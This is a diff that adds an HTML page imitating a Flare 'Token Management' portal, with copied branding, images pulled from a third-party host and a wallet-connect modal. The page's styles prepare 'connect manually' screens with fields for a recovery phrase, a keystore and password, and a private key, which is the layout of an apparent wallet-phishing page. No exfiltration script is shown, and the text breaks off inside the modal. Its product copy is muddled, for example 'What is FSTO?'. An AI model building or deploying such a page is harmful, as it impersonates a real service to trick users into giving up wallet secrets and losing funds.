@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="og:description" content="Flare is a new blockchain built to make it easier for developers to connect different blockchains — even ones that don't support smart contracts, like Bitcoin or XRP. Think of it like a universal adapter for blockchains.">
+    <meta name="description" content="Flare is a new blockchain built to make it easier for developers to connect different blockchains — even ones that don't support smart contracts, like Bitcoin or XRP. Think of it like a universal adapter for blockchains.">
+    <meta property="og:image" content="./assets/flare_logo.svg">
+    <link rel="icon" href="./assets/FLR-iA8A7EPo.svg" type="image/x-icon">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="og:title" content="Token Management | Flare">
+    <meta name="title" content="Token Management | Flare">
+    <title>Token Management | Flare</title>
+    <style>
+        /* Existing styles preserved */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji
+        }
+
+        body,html {
+            overflow-x: hidden
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 45px;
+            height: 95px;
+            border-bottom: 1px solid rgb(207,207,207)
+        }
+
+        header button {
+            padding: 0 32.5px;
+            color: #242425;
+            width: 192.15px;
+            height: 45px;
+            border: .0625rem solid #242425;
+            border-radius: 1.5rem;
+            cursor: pointer;
+            background-color: #fff
+        }
+
+        .delegateButton {
+            padding: 0 32.5px;
+            width: 392.15px;
+            height: 45px;
+            border: .0625rem solid #E62058;
+            color: #e62058;
+            border-radius: 1.5rem;
+            cursor: pointer;
+            background-color: transparent
+        }
+
+        header button:hover {
+            border: .0625rem solid #E62058;
+            color: #e62058
+        }
+
+        nav {
+            display: flex;
+            gap: 25px
+        }
+
+        nav li {
+            list-style-type: none;
+            cursor: pointer
+        }
+
+        main {
+            display: flex;
+            flex-direction: column;
+            gap: 30px
+        }
+
+        .main-div {
+            margin: auto;
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            align-items: center;
+            padding: 35px 25px;
+            border-radius: 10px
+        }
+
+        .main-div button {
+            padding: 0 32.5px;
+            color: #fff;
+            width: 80%;
+            height: 50px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            background-color: #fb2360
+        }
+
+        .main-div-2 {
+            margin: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 50px;
+            padding: 35px 25px
+        }
+
+        .main-div-3 {
+            margin: auto;
+            display: flex;
+            width: 967px;
+            text-align: center;
+            gap: 20px;
+            background-color: #c5c5c6;
+            padding: 20px;
+            justify-content: space-between;
+            border-radius: 10px
+        }
+
+        .main-div-4 {
+            margin: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 50px;
+            padding: 35px 25px
+        }
+
+        .main-div-5 {
+            margin: auto;
+            display: flex;
+            gap: 20px;
+            text-align: center;
+            background-color: #c5c5c6;
+            padding: 20px;
+            justify-content: space-evenly;
+            align-items: center;
+            border-radius: 10px;
+            width: 90%
+        }
+
+        .main-div-5-p p {
+            font-size: 34px
+        }
+
+        .main-p {
+            height: auto;
+            border-radius: 10px;
+            margin: auto;
+            color: #e2e1e1
+        }
+
+        .main-p-div {
+            display: flex;
+            flex-direction: column;
+            padding: 55px;
+            gap: 100px
+        }
+
+        .main-p-div-p {
+            display: flex
+        }
+
+        .main-div-6 svg {
+            width: 36px
+        }
+
+        .main-div-s5 {
+            margin: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 50px;
+            padding: 35px 25px
+        }
+
+        .main-div-6 {
+            display: flex;
+            margin: auto
+        }
+
+        .main-div-6-div {
+            display: flex;
+            gap: 10px;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        .main-div-6-p {
+            width: 377px;
+            background-color: #c5c5c6;
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            overflow: hidden;
+            border-radius: 10px
+        }
+
+        footer {
+            margin-top: 100px;
+            margin-bottom: 100px
+        }
+
+        .footer-div {
+            display: flex;
+            justify-content: space-evenly
+        }
+
+        .main-div-s5-div {
+            display: grid;
+            grid-template-columns: repeat(auto-fit,minmax(300px,1fr));
+            gap: 50px;
+            width: 1187px;
+            margin: 0 auto;
+            padding: 16px
+        }
+
+        .main-div-s5-div p {
+            width: 240px
+        }
+
+        .main-div-7 {
+            margin: auto;
+            display: flex;
+            gap: 20px;
+            text-align: center;
+            background-color: #c5c5c6;
+            padding: 20px;
+            justify-content: space-evenly;
+            align-items: center;
+            border-radius: 10px;
+            width: 90%
+        }
+
+        /* Modal Styles - Updated */
+        .bScreen {
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            background-color: #ffffffec;
+            overflow: hidden;
+            display: none;
+            justify-content: center;
+            align-items: center
+        }
+
+        .inScreen {
+            display: block;
+            background-color: #fff;
+            height: 461.95px;
+            width: 387px;
+            outline: 0px;
+            -webkit-tap-highlight-color: transparent;
+            text-decoration: none;
+            color: #000;
+            box-sizing: border-box;
+            border-radius: .9375rem;
+            box-shadow: #0000000d 0 .0625rem .1875rem,#0000000d 0 2.25rem 1.75rem -.4375rem,#0000000a 0 1.0625rem 1.0625rem -.4375rem;
+            pointer-events: all;
+            padding: 20px;
+            overflow-y: auto
+        }
+
+        .hScreen {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            width: 100%
+        }
+
+        .bdScreen {
+            height: 350px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-evenly
+        }
+
+        .bdScreen button {
+            padding: 9px 12px 9px 28px;
+            color: #242425;
+            width: 100%;
+            height: 65px;
+            border: .0625rem solid #242425;
+            border-radius: 1.5rem;
+            cursor: pointer;
+            background-color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        .bdScreen button p {
+            display: flex;
+            flex-direction: column;
+            align-items: start;
+            gap: 2px
+        }
+
+        /* Error Screen Styles */
+        .erScreen {
+            display: none;
+            background-color: #fff;
+            height: 421.95px;
+            width: 387px;
+            outline: 0px;
+            -webkit-tap-highlight-color: transparent;
+            text-decoration: none;
+            color: #000;
+            box-sizing: border-box;
+            border-radius: .9375rem;
+            box-shadow: #0000000d 0 .0625rem .1875rem,#0000000d 0 2.25rem 1.75rem -.4375rem,#0000000a 0 1.0625rem 1.0625rem -.4375rem;
+            pointer-events: all;
+            padding: 20px;
+            overflow-y: auto;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .error-message {
+            border: 1px solid #e62058;
+            border-radius: 8px;
+            padding: 16px;
+            color: #e62058;
+            text-align: center;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .wallet-option-error {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            background: white;
+            margin-bottom: 8px;
+        }
+
+        .wallet-option-error img {
+            width: 45px;
+            height: 45px;
+            flex-shrink: 0;
+        }
+
+        .wallet-name-error {
+            font-size: 16px;
+            font-weight: 500;
+            color: #111827;
+        }
+
+        .connect-manually {
+            background: #e62058;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+
+        .connect-manually:hover {
+            background: #d01a4e;
+        }
+
+        /* Manual Connection Screens */
+        .phScreen, .ksScreen, .pkScreen {
+            display: none;
+            background-color: #fff;
+            height: 461.95px;
+            width: 387px;
+            outline: 0px;
+            -webkit-tap-highlight-color: transparent;
+            text-decoration: none;
+            color: #000;
+            box-sizing: border-box;
+            border-radius: .9375rem;
+            box-shadow: #0000000d 0 .0625rem .1875rem,#0000000d 0 2.25rem 1.75rem -.4375rem,#0000000a 0 1.0625rem 1.0625rem -.4375rem;
+            pointer-events: all;
+            padding: 20px;
+            overflow-y: auto;
+            flex-direction: column;
+        }
+
+        .manual-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .manual-header img {
+            width: 45px;
+            height: 45px;
+        }
+
+        .close-manual {
+            cursor: pointer;
+            color: #6b7280;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .close-manual:hover {
+            color: #374151;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e5e7eb;
+            margin-bottom: 24px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px 16px;
+            text-align: center;
+            cursor: pointer;
+            color: #6b7280;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+
+        .tab.active {
+            color: #111827;
+            border-bottom-color: #e62058;
+        }
+
+        .tab:hover {
+            color: #374151;
+        }
+
+        .form-control {
+            resize: none;
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #e62058;
+            box-shadow: 0 0 0 3px rgba(230, 32, 88, 0.1);
+        }
+
+        .phrase-input {
+            min-height: 120px;
+        }
+
+        .keystore-input {
+            min-height: 100px;
+        }
+
+        .private-key-input {
+            min-height: 60px;
+        }
+
+        .password-input {
+            min-height: 40px;
+            margin-top: 16px;
+        }
+
+        .input-hint {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 24px;
+        }
+
+        .proceed {
+            padding: 0 32.5px;
+            color: #242425;
+            width: 192.15px;
+            height: 45px;
+            border-radius: 1.5rem;
+            cursor: pointer;
+            background-color: #fff;
+            border: .0625rem solid #242425;
+            align-self: center;
+            margin-top: auto;
+        }
+
+        .proceed:hover {
+            border: .0625rem solid #E62058;
+            color: #e62058
+        }
+
+        /* Loading dots animation */
+        .loading-dots:after {
+            content: '.';
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% {
+                content: '.';
+            }
+            40% {
+                content: '..';
+            }
+            60% {
+                content: '...';
+            }
+            80%, 100% {
+                content: '';
+            }
+        }
+
+        @media (max-width: 600px) {
+            .main-div-7 {
+                flex-direction:column
+            }
+
+            .main-div-s5-div {
+                display: flex;
+                flex-direction: column;
+                width: 100%
+            }
+
+            header {
+                padding: 0 10px
+            }
+
+            nav {
+                display: none
+            }
+
+            .main-div {
+                padding: 0;
+                border-radius: 0;
+                width: 99%
+            }
+
+            .main-p-div {
+                padding: 10px
+            }
+
+            .main-p-div-p img {
+                width: 200px
+            }
+
+            .main-div button {
+                width: 100%
+            }
+
+            .main-p-div span {
+                font-size: 20px
+            }
+
+            .main-div-img {
+                display: none
+            }
+
+            .main-div-2 img,.main-div-4 img {
+                width: 400px
+            }
+
+            .main-div-3 {
+                justify-content: start;
+                border-radius: 0;
+                width: 99%;
+                overflow: hidden
+            }
+
+            .main-div-5 {
+                border-radius: 0
+            }
+
+            .main-div-5 img {
+                width: 115.48px
+            }
+
+            .main-div-5-p p {
+                font-size: 38px
+            }
+
+            .main-div-6-div {
+                flex-direction: column
+            }
+
+            .main-div-6-div div {
+                width: 99%
+            }
+
+            .main-div-6 p {
+                width: 400px
+            }
+
+            footer {
+                margin-bottom: 100px
+            }
+        }
+
+
+       
+.loading-dots::after {
+    content: ' .';
+    animation: dots 1s steps(5, end) infinite;
+}
+
+@keyframes dots {
+    0%, 20% {
+        color: rgba(0,0,0,0);
+        text-shadow:
+            .25em 0 0 rgba(0,0,0,0),
+            .5em 0 0 rgba(0,0,0,0);
+    }
+    40% {
+        color: #333;
+        text-shadow:
+            .25em 0 0 rgba(0,0,0,0),
+            .5em 0 0 rgba(0,0,0,0);
+    }
+    60% {
+        text-shadow:
+            .25em 0 0 #333,
+            .5em 0 0 rgba(0,0,0,0);
+    }
+    80%, 100% {
+        text-shadow:
+            .25em 0 0 #333,
+            .5em 0 0 #333;
+    }
+}
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div>
+            <header class="large">
+                <img width="100px" alt="Flare Logo" src="data:image/svg+xml,%3c?xml%20version='1.0'%20encoding='UTF-8'?%3e%3csvg%20id='Layer_1'%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20601.18%20207.11'%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:%23242425;}%3c/style%3e%3c/defs%3e%3cpath%20class='cls-1'%20d='M149.26,81.07l-89.56-.07c-24.42,0-44.72,19.31-45.36,44.13-.02,.66,.53,1.21,1.19,1.21l89.56,.06h0c24.42,.01,44.72-19.3,45.36-44.11,.02-.66-.53-1.21-1.19-1.21Z'/%3e%3cpath%20class='cls-1'%20d='M194.65,13.08l-134.96-.07c-24.42,0-44.72,19.31-45.36,44.13-.02,.66,.53,1.21,1.19,1.21l134.96,.06h0c24.42,.01,44.72-19.3,45.36-44.11,.02-.66-.53-1.21-1.19-1.21Z'/%3e%3ccircle%20class='cls-1'%20cx='37.03'%20cy='171.4'%20r='22.7'%20transform='translate(-62.77%2027.22)%20rotate(-22.5)'/%3e%3crect%20class='cls-1'%20x='290.62'%20y='35.77'%20width='24.3'%20height='135.71'/%3e%3cpath%20class='cls-1'%20d='M587.44,125.31c0-25.24-17.76-46.36-42.81-46.36-26.92,0-44.12,22.06-44.12,47.3,0,28.41,20.38,47.11,47.48,47.11,14.02,0,28.41-5.79,37.2-16.26l-13.83-13.83c-4.3-4.67-12.53,10.47-22.81,10.47-12.9,0-23.18-8.79-24.49-21.5h62.81c.37-2.06,.56-4.49,.56-6.92Zm-62.25-10.84c1.12-8.23,9.35-15.89,19.44-15.89s17.2,7.85,17.95,15.89h-37.39Z'/%3e%3cpath%20class='cls-1'%20d='M400,89.4l-1.72-1.4c-7.33-5.98-16.5-9.14-26.52-9.14-24.96,0-44.51,20.81-44.51,47.38,0,11.87,4.12,23.18,11.61,31.85,8.26,9.6,21.05,15.33,34.23,15.33,9.57,0,18.03-3.07,25.16-9.13l1.73-1.47v8.69h21.82V80.77h-21.82v8.63Zm-25.26,64.81c-14.57,0-26.43-12.45-26.43-27.76s11.86-27.76,26.43-27.76,26.43,12.45,26.43,27.76-11.86,27.76-26.43,27.76Z'/%3e%3cpath%20class='cls-1'%20d='M485.21,78.86c-10.02,0-19.19,3.16-26.52,9.14l-1.72,1.4v-8.63h-21.82v90.74h21.79v-47.29c0-7.3,2.97-14.38,8.48-19.17,4.57-3.97,10.43-6.36,16.81-6.36,4.23,0,8.22,1.05,11.77,2.91l7.21-19.69c-4.95-1.97-10.34-3.06-16.01-3.06Z'/%3e%3cpath%20class='cls-1'%20d='M226.56,171.48h22.8V99.63h25.9v-18.97h-25.9v-3.93c0-8.93,1.41-12.52,3.67-15.4l.02-.03c3.21-3.81,8.18-5.74,14.79-5.74,2.02,0,4.59,.29,6.63,.73l3.46-19.2c-4.23-1.02-8.34-1.45-13.54-1.45-11.13,0-21.14,3.77-28.2,10.62-6.67,6.47-9.64,15.58-9.64,29.52v4.89h-16.7v18.97h16.7v71.85Z'/%3e%3c/svg%3e">
+                <nav>
+                    <li>Account</li>
+                    <li>Staking</li>
+                    <li>USDT0</li>
+                    <li>Voting</li>
+                    <li>Management</li>
+                </nav>
+                <div>
+                    <button id="connectWalletBtn">Connect Wallet</button>
+                </div>
+            </header>
+            <main>
+                <section class="main-div">
+                    <img class="main-div-img" width="320" height="320" alt="FAssets" src="https://portal-amber-nine.vercel.app/assets/fassets-CX8VEsFP.webp">
+                    <div class="main-p-div">
+                        <div style="display: flex; flex-direction: column; gap: 20px; align-items: center;">
+                            <video autoplay="" loop="" src="./assets/city_ori.mp4" style="height: 320px; width: 320px;"></video>
+                        </div>
+                    </div>
+                </section>
+                <section class="main-div-2">
+                    <h2>What is FSTO?</h2>
+                    <h2>Flare Time Series Oracle (FTSO) is an enshrined oracle that <br> provides decentralized data feeds to Flare.</h2>
+                    <h2>How it Works</h2>
+                    <img alt="How FTSO Works" src="https://portal-amber-nine.vercel.app/assets/FTSO_How_It_Works_Desktop-ckUzDWMi.svg">
+                </section>
+                <section class="main-div-3">
+                    <div style="display: flex; flex-direction: column; gap: 30px;">
+                        <p style="font-size: 40px;">Integrate FDC</p>
+                        <span>FAssets v1.1 Launches on Songbird <br> – Unlocking Scalable FXRP Minting</span>
+                    </div>
+                    <img width="351" height="164" alt="Developer Hub" src="https://portal-amber-nine.vercel.app/assets/dev_hub_ani_noblur0001-Cg4r8HKd.webp">
+                </section>
+                <section class="main-div-4">
+                    <h2>Use Cases</h2>
+                    <h2>FDC powers a variety of DeFi use cases</h2>
+                    <img width="1187px" alt="FAssets Use Cases" src="https://portal-amber-nine.vercel.app/assets/FAssets%20v1-B435Ockh.webp">
+                </section>
+                <section class="main-div-5">
+                    <div style="display: flex;">
+                        <div style="display: flex; flex-direction: column; justify-content: space-around; gap: 20px;">
+                            <p style="font-size: 30px;">Delegate & Stake</p>
+                            <div class="main-div-5-p">
+                                <p>Boost your rewards by delegating or staking FLR.</p>
+                            </div>
+                            <div style="height: 172px; display: flex; align-items: center; justify-content: center;">
+                                <img width="100" height="100" alt="Delegate and Stake" src="https://portal-amber-nine.vercel.app/assets/dandstake-WrADrlA6.webp">
+                            </div>
+                            <div>
+                                <button class="delegateButton">Delegate And Stake</button>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <section class="main-div-s5">
+                    <h2 style="font-size: 22px; font-family: var(--satoshi); font-weight: 700;">FTSO secures the Flare ecosystem with decentralized data</h2>
+                    <div class="main-div-s5-div">
+                        <p style="display: flex; flex-direction: column; width: 100%;"><span style="display: flex;"> <img alt="" src="assets/DOWNLOADG.SVG"> <h3>Secure</h3></span><span>FTSO is enshrined in the Flare blockchain, inheriting its full economic security to ensure robust data.</span></p>
+                        <p style="display: flex; flex-direction: column; width: 100%;"><span style="display: flex;"> <img alt="" src="assets/fast.svg"> <h3>Fast</h3></span><span>FTSO provides block-latency feeds that update approximately every 1.8 seconds, delivering real-time data.</span></p>
+                        <p style="display: flex; flex-direction: column; width: 100%;"><span style="display: flex;"> <img alt="" src="assets/scalable.SVG"> <h3>Scalable</h3></span><span>Supporting up to 1,000 feeds across equities, commodities, and cryptocurrencies, FTSO scales with the growing DeFi ecosystem.</span></p>
+                        <p style="display: flex; flex-direction: column; width: 100%;"><span style="display: flex;"> <img alt="" src="assets/manipulation.svg"> <h3>Manipulation-resistant</h3></span><span>Each feed is backed by around 100 independent data providers, selected by Flare users through delegated stake.</span></p>
+                        <p style="display: flex; flex-direction: column; width: 100%;"><span style="display: flex;"> <img alt="" src="assets/download (1).svg"> <h3>Cost-effective</h3></span><span>Access to block-latency feeds is completely free on Flare, lowering barriers and fostering broad participation and innovation.</span></p>
+                    </div>
+                </section>
+                <section class="main-div-6">
+                    <div class="main-div-6-div">
+                        <div style="display: flex; flex-direction: column; gap: 15px;">
+                            <p class="main-div-6-p"><img height="51.7" width="200" alt="" src="assets/FAssets-2.svg"><img height="250" alt="FAssets" src="assets/fassets.webp"></p>
+                            <h3>Guide to claiming the FAssets </h3>
+                        </div>
+                        <div style="display: flex; flex-direction: column; gap: 15px;">
+                            <p class="main-div-6-p"><img height="51.7" width="200" alt="/assets/XRP-Bx6pBazS.svg" src="assets/XRP.svg"><img height="250" alt="FAssets" src="assets/fassets.webp"></p>
+                            <h3>FAssets v1.1 Launches on Songbird </h3>
+                        </div>
+                        <div style="display: flex; flex-direction: column; gap: 15px;">
+                            <p class="main-div-6-p"><img height="51.7" width="200" alt="/assets/sparkdex-1-CqtyVWg0.svg" src="https://portal-amber-nine.vercel.app/assets/sparkdex-1-CqtyVWg0.svg"><img height="250" alt="FAssets" src="assets/fassets.webp"></p>
+                            <h3>New DeFi milestones for Flare protocols</h3>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Wallet Connect Modal -->
+                <section id="bScreen" class="bScreen">
+                    <!-- Initial Wallet Selection Screen -->
+                    <div id="inScreen" class="inScreen">
+                        <div class="hScreen">
+                            <p>Connect Wallet</p>
+                            <p id="closeWalletConnect" style="cursor: pointer;"><svg viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 1rem; height: 1rem;"><path d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z" fill="currentColor" fill-rule="evenodd" clip-rule="evenodd"></path></svg></p>
+                        </div>
+                        <div class="bdScreen">
+                            <button data-wallet="MetaMask">
+                                <p><span>MetaMask</span><span>Connect</span></p>
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 318.6 318.6" width="45" height="45"><style>
+                                        .st0{fill:#E2761B;stroke:#E2761B;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st1{fill:#E4761B;stroke:#E4761B;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st2{fill:#D7C1B3;stroke:#D7C1B3;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st3{fill:#233447;stroke:#233447;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st4{fill:#CD6116;stroke:#CD6116;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st5{fill:#E4751F;stroke:#E4751F;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st6{fill:#F6851B;stroke:#F6851B;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st7{fill:#C0AD9E;stroke:#C0AD9E;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st8{fill:#161616;stroke:#161616;stroke-linecap:round;stroke-linejoin:round;}
+                                        .st9{fill:#763D16;stroke:#763D16;stroke-linecap:round;stroke-linejoin:round;}
+                                    </style><polygon class="st0" points="274.1,35.5 174.6,109.4 193,65.8 "></polygon><g><polygon class="st1" points="44.4,35.5 143.1,110.1 125.6,65.8"></polygon><polygon class="st1" points="238.3,206.8 211.8,247.4 268.5,263 284.8,207.7"></polygon><polygon class="st1" points="33.9,207.7 50.1,263 106.8,247.4 80.3,206.8"></polygon><polygon class="st1" points="103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1"></polygon><polygon class="st1" points="214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1"></polygon><polygon class="st1" points="106.8,247.4 140.6,230.9 111.4,208.1"></polygon><polygon class="st1" points="177.9,230.9 211.8,247.4 207.1,208.1"></polygon></g><g><polygon class="st2" points="211.8,247.4 177.9,230.9 180.6,253 180.3,262.3"></polygon><polygon class="st2" points="106.8,247.4 138.3,262.3 138.1,253 140.6,230.9"></polygon></g><polygon class="st3" points="138.8,193.5 110.6,185.2 130.5,176.1"></polygon><polygon class="st3" points="179.7,193.5 188,176.1 208,185.2"></polygon><g><polygon class="st4" points="106.8,247.4 111.6,206.8 80.3,207.7"></polygon><polygon class="st4" points="207,206.8 211.8,247.4 238.3,207.7"></polygon><polygon class="st4" points="230.8,162.1 174.6,164.6 179.8,193.5 188.1,176.1 208.1,185.2"></polygon><polygon class="st4" points="110.6,185.2 130.6,176.1 138.8,193.5 144.1,164.6 87.8,162.1"></polygon></g><g><polygon class="st5" points="87.8,162.1 111.4,208.1 110.6,185.2"></polygon><polygon class="st5" points="208.1,185.2 207.1,208.1 230.8,162.1"></polygon><polygon class="st5" points="144.1,164.6 138.8,193.5 145.4,227.6 146.9,182.7"></polygon><polygon class="st5" points="174.6,164.6 171.9,182.6 173.1,227.6 179.8,193.5"></polygon></g><polygon class="st6" points="179.8,193.5 173.1,227.6 177.9,230.9 207.1,208.1 208.1,185.2"></polygon><polygon class="st6" points="110.6,185.2 111.4,208.1 140.6,230.9 145.4,227.6 138.8,193.5"></polygon><polygon class="st7" points="180.3,262.3 180.6,253 178.1,250.8 140.4,250.8 138.1,253 138.3,262.3 106.8,247.4 117.8,256.4 140.1,271.9 178.4,271.9 200.8,256.4 211.8,247.4"></polygon><polygon class="st8" points="177.9,230.9 173.1,227.6 145.4,227.6 140.6,230.9 138.1,253 140.4,250.8 178.1,250.8 180.6,253"></polygon><g><polygon class="st9" points="278.3,114.2 286.8,73.4 274.1,35.5 177.9,106.9 214.9,138.2 267.2,153.5 278.8,140 273.8,136.4 281.8,129.1 275.6,124.3 283.6,118.2"></polygon><polygon class="st9" points="31.8,73.4 40.3,114.2 34.9,118.2 42.9,124.3 36.8,129.1 44.8,136.4 39.8,140 51.3,153.5 103.6,138.2 140.6,106.9 44.4,35.5"></polygon></g><polygon class="st6" points="267.2,153.5 214.9,138.2 230.8,162.1 207.1,208.1 238.3,207.7 284.8,207.7"></polygon><polygon class="st6" points="103.6,138.2 51.3,153.5 33.9,207.7 80.3,207.7 111.4,208.1 87.8,162.1"></polygon><polygon class="st6" points="174.6,164.6 177.9,106.9 193.1,65.8 125.6,65.8 140.6,106.9 144.1,164.6 145.3,182.8 145.4,227.6 173.1,227.6 173.3,182.8"></polygon></svg>
+                            </button>
+                            <button data-wallet="WalletConnect">
+                                <p><span>Wallet Connect</span><span>Connect</span></p>
+                                <svg width="45" height="45" viewBox="0 0 512 512" version="1.1" xmlns="http://www.w3.org/2000/svg"><title>logo</title><desc>Created with Sketch.</desc><defs><radialGradient cx="0%" cy="50%" fx="0%" fy="50%" r="100%" id="radialGradient-1"><stop stop-color="#5D9DF6" offset="0%"></stop><stop stop-color="#006FFF" offset="100%"></stop></radialGradient></defs><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g><rect fill="url(#radialGradient-1)" x="0" y="0" width="512" height="512" rx="256"></rect><path d="M169.209772,184.531136 C217.142772,137.600733 294.857519,137.600733 342.790517,184.531136 L348.559331,190.179285 C350.955981,192.525805 350.955981,196.330266 348.559331,198.676787 L328.82537,217.99798 C327.627045,219.171241 325.684176,219.171241 324.485851,217.99798 L316.547278,210.225455 C283.10802,177.485633 228.89227,177.485633 195.453011,210.225455 L186.951456,218.549188 C185.75313,219.722448 183.810261,219.722448 182.611937,218.549188 L162.877976,199.227995 C160.481326,196.881474 160.481326,193.077013 162.877976,190.730493 L169.209772,184.531136 Z M383.602212,224.489406 L401.165475,241.685365 C403.562113,244.031874 403.562127,247.836312 401.165506,250.182837 L321.971538,327.721548 C319.574905,330.068086 315.689168,330.068112 313.292501,327.721609 C313.292491,327.721599 313.29248,327.721588 313.29247,327.721578 L257.08541,272.690097 C256.486248,272.103467 255.514813,272.103467 254.915651,272.690097 C254.915647,272.690101 254.915644,272.690105 254.91564,272.690108 L198.709777,327.721548 C196.313151,330.068092 192.427413,330.068131 190.030739,327.721634 C190.030725,327.72162 190.03071,327.721606 190.030695,327.721591 L110.834524,250.181849 C108.437875,247.835329 108.437875,244.030868 110.834524,241.684348 L128.397819,224.488418 C130.794468,222.141898 134.680206,222.141898 137.076856,224.488418 L193.284734,279.520668 C193.883897,280.107298 194.85533,280.107298 195.454493,279.520668 C195.454502,279.520659 195.45451,279.520651 195.454519,279.520644 L251.65958,224.488418 C254.056175,222.141844 257.941913,222.141756 260.338618,224.488222 C260.338651,224.488255 260.338684,224.488288 260.338717,224.488321 L316.546521,279.520644 C317.145683,280.107273 318.117118,280.107273 318.71628,279.520644 L374.923175,224.489406 C377.319825,222.142885 381.205562,222.142885 383.602212,224.489406 Z" fill="#FFFFFF" fill-rule="nonzero"></path></g></g></svg>
+                            </button>
+                            <button data-wallet="Coinbase">
+                                <p><span>Coinbase Connect</span><span>Connect</span></p>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="45" height="45" viewBox="0 0 56 56" fill="none"><path d="M27.9993 4.6665C15.103 4.6665 4.66602 15.1034 4.66602 27.9998C4.66602 40.8962 15.103 51.3332 27.9993 51.3332C40.8957 51.3332 51.3327 40.8962 51.3327 27.9998C51.3327 15.1034 40.8957 4.6665 27.9993 4.6665ZM27.9993 41.653C20.4633 41.653 14.3462 35.5359 14.3462 27.9998C14.3462 20.4638 20.4633 14.3467 27.9993 14.3467C35.5354 14.3467 41.6525 20.4638 41.6525 27.9998C41.6525 35.5359 35.5354 41.653 27.9993 41.653Z" fill="url(#paint0_linear)"></path><path d="M31.3106 32.3827H24.689C24.1214 32.3827 23.6484 31.9097 23.6484 31.3421V24.689C23.6484 24.1214 24.1214 23.6484 24.689 23.6484H31.3421C31.9097 23.6484 32.3827 24.1214 32.3827 24.689V31.3421C32.3827 31.9097 31.9097 32.3827 31.3106 32.3827Z" fill="#2059EB"></path><defs><linearGradient id="paint0_linear" x1="27.9993" y1="51.3332" x2="27.9993" y2="4.6665" gradientUnits="userSpaceOnUse"><stop stop-color="#1447EA"></stop><stop offset="1" stop-color="#2B65FB"></stop></linearGradient></defs></svg>
+                            </button>
+                            <button data-wallet="Ledger">
+                                <p><span>Ledger</span><span>Connect</span></p>
+                                <svg height="35" viewBox="0 0 147 128" fill="none" xmlns="http://www.w3.org/2000/svg" style="padding-right: 8px;"><path d="M0 91.6548V128H55.293V119.94H8.05631V91.6548H0ZM138.944 91.6548V119.94H91.707V127.998H147V91.6548H138.944ZM55.3733 36.3452V91.6529H91.707V84.3842H63.4296V36.3452H55.3733ZM0 0V36.3452H8.05631V8.05844H55.293V0H0ZM91.707 0V8.05844H138.944V36.3452H147V0H91.707Z" fill="black"></path></svg>
+                            </button>
+                            <p style="font-size: 15px;">By connecting a wallet, you agree to the<span style="color: rgb(230, 32, 88);"> Terms of Service</span></p>
+                        </div>
